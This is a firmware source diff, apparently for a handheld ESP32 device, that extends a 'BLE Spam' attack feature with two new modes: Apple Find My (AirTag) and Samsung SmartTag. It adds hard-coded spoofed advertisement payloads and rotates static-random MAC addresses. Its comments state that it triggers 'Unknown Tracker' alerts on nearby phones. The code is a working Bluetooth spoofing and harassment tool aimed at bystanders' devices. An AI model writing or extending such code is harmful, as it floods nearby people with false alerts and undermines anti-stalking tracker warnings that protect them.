@@ -146,11 +146,13 @@ static bt_device_info_t bt_devices[BT_MAX_DEVICES];
 static int bt_device_count = 0;
 
 // BLE Spam attack state
-#define BLE_SPAM_MODE_APPLE   0
-#define BLE_SPAM_MODE_SAMSUNG 1
-#define BLE_SPAM_MODE_GOOGLE  2
-#define BLE_SPAM_MODE_WINDOWS 3
-#define BLE_SPAM_MODE_ALL     4
+#define BLE_SPAM_MODE_APPLE    0
+#define BLE_SPAM_MODE_SAMSUNG  1
+#define BLE_SPAM_MODE_GOOGLE   2
+#define BLE_SPAM_MODE_WINDOWS  3
+#define BLE_SPAM_MODE_ALL      4
+#define BLE_SPAM_MODE_AIRTAG   5
+#define BLE_SPAM_MODE_SMARTTAG 6
 static volatile bool ble_spam_active = false;
 static TaskHandle_t ble_spam_task_handle = NULL;
 static lv_obj_t *ble_spam_status_label = NULL;
@@ -5683,9 +5685,10 @@ void app_main(void)
                 if (ble_spam_status_label && lv_obj_is_valid(ble_spam_status_label)
                     && ble_spam_active) {
                     static const char *s_mode_names[] = {
-                        "Apple", "Samsung", "Google", "Windows", "All"
+                        "Apple", "Samsung", "Google", "Windows", "All",
+                        "Apple Find My", "Samsung SmartTag"
                     };
-                    int m = ble_spam_mode < 5 ? ble_spam_mode : 4;
+                    int m = (ble_spam_mode >= 0 && ble_spam_mode <= 6) ? ble_spam_mode : 4;
                     char sbuf[48];
                     snprintf(sbuf, sizeof(sbuf), "Sending: %s", s_mode_names[m]);
                     lv_label_set_text(ble_spam_status_label, sbuf);
@@ -22711,6 +22714,32 @@ static const uint8_t s_windows_sp_svc[] = {0x14,0xFE,0x80,0x00,0x00,0x00,0x00};
 static const uint8_t s_windows_sp_svc2[] = {0x14,0xFE,0x80,0x01,0x00,0x00,0x00};
 #define WINDOWS_PAYLOAD_COUNT 2
 
+// Apple Find My (AirTag) — manufacturer data format
+// key[0..5]  → MAC address (NimBLE val[] reversed, val[5] = key[0]|0xC0 for static-random)
+// key[6..27] → 22 advertisement payload bytes
+// hint byte  → key[0] >> 6 (top 2 bits)
+// Mfg data:  0x4C 0x00 0x12 0x19 <status:0x10> <key[6..27]:22> <hint:1> <pad:1>  = 29 bytes
+static const uint8_t s_airtag_keys[][28] = {
+    {0xBA,0x56,0xE9,0xAD,0xC7,0xF2, 0x3B,0x8E,0x11,0xCF,0x72,0xD4,0x55,0x9A,0x8B,0xE6,0x31,0xF8,0xA0,0x4C,0x97,0x1D,0xE5,0x43,0x80,0x2F,0xC9,0x71},
+    {0xD4,0x6F,0xC8,0x3E,0x11,0xA7, 0x5C,0x2B,0x9E,0x44,0x83,0x1A,0xF7,0xC3,0x60,0x2E,0x95,0xB8,0x47,0xD1,0x6A,0x09,0xF5,0x2C,0x74,0xE8,0xBB,0x51},
+    {0xC7,0x4A,0x17,0xB3,0x88,0x2C, 0xE1,0x53,0xF9,0x36,0x7D,0xA8,0x20,0xBE,0xC6,0x5F,0x48,0x9A,0xD3,0x71,0x85,0x1F,0xCE,0x7B,0x42,0xE0,0xA5,0x96},
+    {0x91,0xDE,0x55,0x7A,0x04,0xB8, 0xA2,0x6F,0x28,0xC3,0x8E,0x7B,0x5D,0x31,0x49,0x6A,0xBC,0x77,0xF2,0x04,0xED,0x93,0x18,0xB5,0x64,0xD7,0xC0,0x2E},
+    {0xE5,0x2B,0x9F,0x46,0xC1,0x73, 0x8D,0xF0,0x5A,0x17,0xB4,0x6C,0x39,0xA8,0x25,0xDE,0x7C,0x5B,0x80,0xF3,0x19,0xCA,0x65,0x40,0x2D,0x91,0xE8,0xB7},
+    {0x78,0xA3,0xC6,0x1E,0x50,0x9D, 0x4F,0xB2,0x87,0xD5,0x3C,0xE8,0xA1,0x6F,0x94,0x27,0xDB,0x53,0xB6,0x2A,0x08,0xF7,0xC4,0x39,0x15,0x6E,0xD2,0xA0},
+};
+#define AIRTAG_KEY_COUNT (int)(sizeof(s_airtag_keys)/sizeof(s_airtag_keys[0]))
+
+// Samsung SmartTag Offline Finding — service UUID 0xFD5A + 20-byte payload
+// Format: [UUID_lo UUID_hi] [mode:0x00] [privacy_id:12] [signature:4] [region:0x02] [aging:2]
+// Random Privacy ID + signature triggers Samsung "Unknown Tracker" alert on helper phones.
+static const uint8_t s_smarttag_payloads[][22] = {
+    {0x5A,0xFD, 0x00, 0xD1,0x3A,0x5C,0x72,0xF8,0x4B,0x91,0xE6,0x23,0xC0,0xB5,0x87, 0xA4,0x19,0x7E,0x32, 0x02, 0x00,0x01},
+    {0x5A,0xFD, 0x00, 0xA8,0x4F,0x1D,0x93,0xE5,0x67,0xB2,0x08,0xC7,0x5A,0x3E,0xD4, 0x6B,0xF3,0x85,0xC1, 0x02, 0x00,0x02},
+    {0x5A,0xFD, 0x00, 0x6C,0xB8,0x29,0x44,0x7E,0xA1,0x53,0xF0,0x8D,0x19,0xC6,0x2B, 0xE8,0x37,0xA2,0x54, 0x02, 0x00,0x03},
+    {0x5A,0xFD, 0x00, 0x35,0x7D,0xE2,0xB6,0x94,0x08,0xF5,0xC3,0x71,0xAE,0x4D,0x86, 0x93,0xC5,0x18,0x7D, 0x02, 0x00,0x04},
+};
+#define SMARTTAG_PAYLOAD_COUNT (int)(sizeof(s_smarttag_payloads)/sizeof(s_smarttag_payloads[0]))
+
 // ── SAS proceed wrappers — pre-set target from BT Scan & Select ──────────────
 static void ble_spoof_proceed_from_sas(void)
 {
@@ -22739,6 +22768,7 @@ static void ble_spam_task(void *pvParameters)
 {
     (void)pvParameters;
     int apple_idx = 0, samsung_idx = 0, google_idx = 0, windows_idx = 0;
+    int airtag_idx = 0, smarttag_idx = 0;
     int mode_round = 0; // cycles through modes when ALL
 
     while (ble_spam_active) {
@@ -22762,13 +22792,19 @@ static void ble_spam_task(void *pvParameters)
 
         int cur_mode = ble_spam_mode;
         if (cur_mode == BLE_SPAM_MODE_ALL) {
-            cur_mode = mode_round % 4;
+            static const int all_modes[] = {
+                BLE_SPAM_MODE_APPLE, BLE_SPAM_MODE_SAMSUNG,
+                BLE_SPAM_MODE_GOOGLE, BLE_SPAM_MODE_WINDOWS,
+                BLE_SPAM_MODE_AIRTAG, BLE_SPAM_MODE_SMARTTAG
+            };
+            cur_mode = all_modes[mode_round % 6];
             mode_round++;
         }
 
         bool use_svc = false;
         const uint8_t *svc_data = NULL;
         uint8_t svc_data_len = 0;
+        uint8_t at_mfg[29]; // AirTag Find My manufacturer data buffer
 
         switch (cur_mode) {
         case BLE_SPAM_MODE_APPLE:
@@ -22786,6 +22822,34 @@ static void ble_spam_task(void *pvParameters)
             svc_data = s_google_fp_payloads[google_idx];
             svc_data_len = sizeof(s_google_fp_payloads[0]);
             google_idx = (google_idx + 1) % GOOGLE_PAYLOAD_COUNT;
+            break;
+        case BLE_SPAM_MODE_AIRTAG: {
+            // Apple Find My: MAC = key[0..5] (reversed, static-random bits set on val[5])
+            // Mfg data: company(2) + type 0x12(1) + len 0x19(1) + status(1) + key[6..27](22) + hint(1) + pad(1)
+            const uint8_t *k = s_airtag_keys[airtag_idx];
+            airtag_idx = (airtag_idx + 1) % AIRTAG_KEY_COUNT;
+            ble_addr_t at_addr;
+            at_addr.val[0] = k[5]; at_addr.val[1] = k[4];
+            at_addr.val[2] = k[3]; at_addr.val[3] = k[2];
+            at_addr.val[4] = k[1]; at_addr.val[5] = k[0] | 0xC0;
+            ble_hs_id_set_rnd(at_addr.val);
+            at_mfg[0] = 0x4C; at_mfg[1] = 0x00;
+            at_mfg[2] = 0x12; at_mfg[3] = 0x19;
+            at_mfg[4] = 0x10;
+            memcpy(at_mfg + 5, k + 6, 22);
+            at_mfg[27] = (k[0] >> 6) & 0x03;
+            at_mfg[28] = 0x00;
+            fields.mfg_data = at_mfg;
+            fields.mfg_data_len = sizeof(at_mfg);
+            break;
+        }
+        case BLE_SPAM_MODE_SMARTTAG:
+            // Samsung SmartTag Offline Finding: service UUID 0xFD5A + 20-byte payload
+            // Triggers "Unknown Tracker" alert in Samsung SmartThings Find on helper phones.
+            use_svc = true;
+            svc_data = s_smarttag_payloads[smarttag_idx];
+            svc_data_len = sizeof(s_smarttag_payloads[0]);
+            smarttag_idx = (smarttag_idx + 1) % SMARTTAG_PAYLOAD_COUNT;
             break;
         case BLE_SPAM_MODE_WINDOWS:
         default:
@@ -22885,7 +22949,7 @@ static void show_ble_spam_screen(void)
     lv_obj_align(mode_lbl, LV_ALIGN_TOP_LEFT, 8, 38);
 
     lv_obj_t *dd = lv_dropdown_create(function_page);
-    lv_dropdown_set_options(dd, "Apple (Sour Apple)\nSamsung Fast Connect\nGoogle Fast Pair\nWindows Swift Pair\nAll Platforms");
+    lv_dropdown_set_options(dd, "Apple (Sour Apple)\nSamsung Fast Connect\nGoogle Fast Pair\nWindows Swift Pair\nAll Platforms\nApple Find My (AirTag)\nSamsung SmartTag");
     lv_dropdown_set_selected(dd, (uint16_t)ble_spam_mode);
     lv_obj_set_size(dd, lv_pct(96), 36);
     lv_obj_align(dd, LV_ALIGN_TOP_MID, 0, 58);
